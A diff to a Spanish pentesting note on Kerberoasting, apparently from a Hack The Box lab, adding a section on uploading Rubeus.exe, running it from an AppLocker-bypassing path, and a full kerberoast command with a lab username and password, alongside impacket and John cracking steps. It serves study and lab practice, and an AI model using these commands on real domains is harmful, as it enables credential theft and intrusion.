@@ -12,3 +12,9 @@ Sin embargo, en la actualidad cada vez existe mayor concienciación y por lo tan
 `impacket-GetUserSPNs domain/user:password -request`
 
 Una vez tenemos un TGS, podemos guardarlo en un archivo e intentar crackear la contraseña con John.
+
+## Rubeus.exe
+
+Si tenemos acceso a una terminal con credenciales válidas, podemos subir un ejecutable de Rubeus.exe. Nos vamos a una ruta bypasseando el AppLocker, y ejecutamos lo siguiente:
+
+`.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap`
